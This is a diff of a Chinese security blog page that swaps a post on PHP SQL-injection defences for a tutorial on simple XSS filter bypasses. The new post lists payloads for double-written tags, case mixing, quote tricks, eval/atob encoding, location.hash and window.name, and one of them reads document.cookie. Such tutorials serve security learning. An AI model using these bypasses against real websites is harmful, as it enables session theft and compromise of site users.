@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="">
   <meta name="keywords" content="">
-  <title>SQL注入 漏洞防范 - Cheekkk&#39;s Anti-Gravity Space</title>
+  <title>XSS的简单绕过方式 - Cheekkk&#39;s Anti-Gravity Space</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
@@ -136,7 +136,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    366 字
+                    667 字
                   </span>
                 
 
@@ -146,7 +146,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    6
+                    11
                      分钟
                   </span>
                 
@@ -175,49 +175,95 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <p>PHP中几种防范SQL注入的函数</p>
+              <p>一些常见的绕过</p>
 <a id="more"></a>
 
-<h1 id="SQL注入漏洞防范"><a href="#SQL注入漏洞防范" class="headerlink" title="SQL注入漏洞防范"></a>SQL注入漏洞防范</h1><h2 id="01-GPC-runtime-魔术引号"><a href="#01-GPC-runtime-魔术引号" class="headerlink" title="01 GPC/runtime 魔术引号"></a>01 GPC/runtime 魔术引号</h2><p>magic_quotes_gpc()对GET、POST、COOKIE的值进行过滤</p>
-<p>magic_quotes_runtime()对从数据库或者文件中获取的数据进行过滤</p>
-<p>这两个函数只能对单引号、双引号、反斜杠、空字符进行过滤，对int型的注入作用不大</p>
-<p>PHP4.2.3之前可以在任何地方设置开启，之后的版本可以在php.ini、httpd.conf、.htaccess中开启</p>
-<h2 id="02-过滤类"><a href="#02-过滤类" class="headerlink" title="02 过滤类"></a>02 过滤类</h2><ol>
-<li><p>addslashes<br>对单引号、双引号、反斜杠、空字符进行转义，参数必须是string类型</p>
+<h1 id="XSS的简单绕过方式"><a href="#XSS的简单绕过方式" class="headerlink" title="XSS的简单绕过方式"></a>XSS的简单绕过方式</h1><h3 id="基本绕过"><a href="#基本绕过" class="headerlink" title="基本绕过"></a>基本绕过</h3><ol>
+<li><p><strong>简单的探测方式</strong><br>输入一串不容易重复的字符，使用浏览器检查元素的功能查看用户输入被存储的位置，进一步分析闭合方式<br>输入类似*&lt;script “ ‘ OOnn&gt;*的字符串，根据显示内容，观察对特殊字符的过滤情况</p>
 </li>
-<li><p>mysql_escape_string<br>转义字符有\x00, \n, \r, , ‘, “, \x1a</p>
+<li><p><strong>常用的payload</strong></p>
+<pre><code class="hljs html"> <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">confirm(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+ <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">prompt(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
 </li>
-<li><p>mysql_real_escape_string（更推荐）</p>
-<p>过滤字符同上，不同之处在于接受的是一个连接句柄，并根据当前字符集转义字符串</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-  $con = mysql_connect(<span class="hljs-string">"localhost"</span>,<span class="hljs-string">"root"</span>,<span class="hljs-string">"123456"</span>);
-	$id = mysql_real_escape_string($_GET[<span class="hljs-string">'id'</span>],$con);
-	$sql = <span class="hljs-string">"select * from table where id='"</span>.$id.<span class="hljs-string">"'"</span>;
-	<span class="hljs-keyword">echo</span> $sql;
-<span class="hljs-meta">?&gt;</span></code></pre>
+<li><p><strong>双写绕过</strong></p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">scscriptript</span>&gt;</span>alert('xss')<span class="hljs-tag">&lt;/<span class="hljs-name">scscriptript</span>&gt;</span></code></pre>
 </li>
-<li><p>intval<br>将变量转换成int类型，适用于int型注入</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-  $id = intval(<span class="hljs-string">"1 union select"</span>);
-	<span class="hljs-keyword">echo</span> $id;
-<span class="hljs-meta">?&gt;</span></code></pre>
+<li><p><strong>伪协议</strong></p>
+<pre><code class="hljs javascript">javascript:alert(<span class="hljs-string">'xss'</span>)</code></pre>
 
-<p>输出结果为 1 </p>
-<p>类似的还有floatval等函数</p>
+<p>可以用在a标签中<br>在旧版本ie中也可以用在img标签中</p>
+</li>
+<li><p><strong>利用事件</strong><br>windows事件、form事件、keyboard事件、mouse事件、media事件</p>
+</li>
+<li><p><strong>大小写绕过</strong><br>HTML中不区分大小写，而JS的过滤区分大小写</p>
 </li>
 </ol>
-<h2 id="03-PDO-prepare预编译"><a href="#03-PDO-prepare预编译" class="headerlink" title="03 PDO prepare预编译"></a>03 PDO prepare预编译</h2><p>将sql参数使用？代替，作为占位符</p>
-<p>输入的值只作为参数，而不去拼接SQL语句</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-  dbh = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">"mysql:host=localhost; dbname=demo"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"pass"</span>);
-	$dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,<span class="hljs-keyword">false</span>);
-	$dbh-&gt;exec(<span class="hljs-string">"set names 'gbk'"</span>);
-	$sql = <span class="hljs-string">"select * from test where name = ? and password = ? "</span>;
-	$stmt = $dbh-&gt;prepare($sql);
-	$exeres = $stmt-&gt;execute(<span class="hljs-keyword">array</span>($name,$pass));
-<span class="hljs-meta">?&gt;</span></code></pre>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">Img</span> <span class="hljs-attr">sRc</span>=<span class="hljs-string">'#'</span> <span class="hljs-attr">OnERroR</span>=<span class="hljs-string">"alERt('xss')"</span>/&gt;</span></code></pre>
 
-<p>预编译除了可以避免SQL注入，还可以提高SQL语句的复用</p>
+<ol start="7">
+<li><p><strong>利用引号</strong><br>HTML中对引号不区分，而过滤函数有可能做了区分</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>= <span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>'<span class="hljs-attr">xss</span>') /&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'#'</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">'alert('</span><span class="hljs-attr">xss</span>')'/&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"alert('xss')"</span>/&gt;</span></code></pre>
+</li>
+<li><p><strong>拆分脚本</strong></p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">a=<span class="hljs-string">'alert'</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">a=a+<span class="hljs-string">'(/xss/)'</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(a)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+</li>
+<li><p><strong>使用斜杠代替空格</strong></p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span>/<span class="hljs-attr">src</span>=<span class="hljs-string">#/onerror</span>=<span class="hljs-string">alert(</span>'<span class="hljs-attr">xss</span>')/&gt;</span></code></pre>
+</li>
+<li><p><strong>使用空格、tab和回车分隔开关键</strong>字</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span>    <span class="hljs-attr">src</span>=<span class="hljs-string">#</span>    <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>'<span class="hljs-attr">xss</span>')    /&gt;</span></code></pre>
+</li>
+<li><p><strong>编码绕过</strong></p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(atob(<span class="hljs-string">'base64编码内容'</span>));</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+<p>atob函数执行base64解码功能,eval函数将字符串当作程序执行<br>也可以使用十六进制、unicode等编码<br>类似SQL注入的宽字节注入，XSS也可以用这种方法绕过反斜杠的转义</p>
+</li>
+<li><p>关注最新的HTML标签，往往没有被过滤</p>
+</li>
+</ol>
+<h3 id="绕过对长度的限制"><a href="#绕过对长度的限制" class="headerlink" title="绕过对长度的限制"></a>绕过对长度的限制</h3><ol>
+<li><p><strong>利用事件缩短长度</strong></p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+//缩短为
+onclick=alert('xss')</code></pre>
+
+<p>可以绕过一些</p>
+</li>
+<li><p><strong>利用注释绕过</strong><br>当有两个输入框时，可以考虑利用注释</p>
+<pre><code class="hljs html">//第一个输入框
+"&gt;<span class="hljs-comment">&lt;!--</span>
+<span class="hljs-comment">//第二个输入框</span>
+<span class="hljs-comment">--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+
+//拼接结果
+"&gt;<span class="hljs-comment">&lt;!--中间内容被注释--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+</li>
+<li><p><strong>利用location.hash</strong><br>构造payload如下</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt; <span class="hljs-attr">...</span> <span class="hljs-attr">onclik</span>=<span class="hljs-string">"eval(location.hash.substr(1))"</span> /&gt;</span></code></pre>
+
+<p>URL为: <a href="http://xxx.com/yyy.html/#alert(1)" target="_blank" rel="noopener">http://xxx.com/yyy.html/#alert(1)</a><br>从#起即为location.hash<br>substr(1)用于去掉#</p>
+<p>location.hash的内容不会被日志记录，更加隐蔽</p>
+</li>
+<li><p><strong>利用window.name</strong><br>对当前窗口的window.name赋值，没有特殊字符的限制，而且不受同源策略的影响<br>在本地构造payload如下</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
+<span class="javascript">  <span class="hljs-built_in">window</span>.name=<span class="hljs-string">"alert(document.cookie)"</span></span>
+<span class="actionscript">  location.href=<span class="hljs-string">"目标地址"</span></span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+
+<p>跳转到目标地址后，只需要执行</p>
+<pre><code class="hljs html">eval(name);</code></pre>
+
+<p>由于window.name 可以跨域，就成功执行了</p>
+<pre><code class="hljs html">eval(alert(document.cookie))</code></pre>
+
+
+
+</li>
+</ol>
 
             </article>
             <hr>
@@ -237,9 +283,7 @@
                     
                       <a class="hover-with-bg" href="/tags/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>
                     
-                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
-                    
-                      <a class="hover-with-bg" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+                      <a class="hover-with-bg" href="/tags/XSS/">XSS</a>
                     
                   </div>
                 
@@ -252,9 +296,9 @@
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/">
+                      <a href="/XSS%E7%9A%84%E7%AE%80%E5%8D%95%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">PHP代码执行漏洞简介</span>
+                        <span class="hidden-mobile">XSS的简单防御方式</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -262,8 +306,8 @@
                   <div class="post-next col-6">
                     
                     
-                      <a href="/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/">
-                        <span class="hidden-mobile">PHP命令执行漏洞简介</span>
+                      <a href="/XSS%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/">
+                        <span class="hidden-mobile">XSS漏洞简介</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -403,7 +447,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "SQL注入 漏洞防范&nbsp;",
+        "XSS的简单绕过方式&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 40,
